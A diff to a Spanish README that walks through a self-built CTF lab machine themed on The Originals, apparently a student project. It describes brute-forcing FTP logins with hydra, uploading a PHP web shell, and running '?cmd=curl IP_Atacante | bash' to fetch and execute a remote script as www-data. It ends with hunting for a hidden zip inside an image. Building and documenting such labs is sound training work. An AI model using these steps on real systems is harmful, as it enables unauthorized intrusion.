@@ -190,18 +190,29 @@ Para empezar tenemos una web inspirada en la serie The Originals. Hemos implemen
 
 En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get.
 
+En la web podemos obserbar una galeria con diferentes personajes, donde el atacante puede hacer una lista y probar de hacer un hydra con cada unos de estos personajes, hasta acertar con el usuario.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/0ce0aa3a-6ba9-45a4-988c-ba699a50ad58)
 
 
-El atacante debera hacer un hydra en este usuario para sacar la contraseña, este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
+Este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
 
 Tendra que subir un archivo php para ejecutar comandos desde la web. 
 
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/895f89b4-6099-4433-8876-5c1d98dd4e64)
+
+
 La maquina atacante tendra lo siguiente:
 
-- Un archivo html con codigo bash dento.
+- Un archivo html con codigo bash dento, y en la misma ruta del archivo abrir .
 - Un terminal abierto para ponernos en escucha en http.
 
 Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash.
-Y en el terminal podemos observar que nos hemos registrado como www-data.
+Y en el terminal atacante podemos observar que nos hemos registrado como www-data.
+
+Dentro de este usuario encontramos que no podemos acceder a ningun archivo con privilegios, pero obserbamos que hay un usuario llamado Caroline.
+Y en el directorio /etc encontramos una imaghen de carolina la cual si la descargamos a la maquina local y le hacemos un binwalk vemos que tiene un zip dentro.
+
+
 
 
